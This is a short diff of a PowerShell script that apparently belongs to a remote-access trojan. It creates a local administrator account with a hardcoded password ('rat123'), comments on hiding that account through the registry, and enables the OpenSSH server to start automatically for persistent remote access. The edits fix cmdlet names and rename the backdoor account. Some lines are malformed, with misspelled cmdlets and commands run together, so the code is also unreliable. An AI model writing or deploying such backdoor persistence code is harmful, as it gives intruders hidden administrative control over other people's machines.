@@ -22,7 +22,7 @@ function create_account {
      begin {
      }
         process {
-            New-Location "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
+            New-LocalUser "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
             write-Verbose "$uname local user created" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
             
         }
@@ -32,8 +32,8 @@ function create_account {
     }
 
 #create admin user
-$uname = "WindowsGuest"
-$pword = (ConvertTo-Securestring "rat123"-AsPlainText -Force)
+$uname = "random_text"
+$pword = (ConvertTo-SecureString "rat123"-AsPlainText -Force)
 create_account  -uname $uname -pword $pword
 
 #registry  to hide local admin
@@ -73,7 +73,7 @@ $initial_dir = Get-Location
 
 
 #enabling  the presistance ssh 
-Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service  -Name sshd-StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 
+Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service  -Name sshd -StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 
 
 
 #goto temp ,make working directory
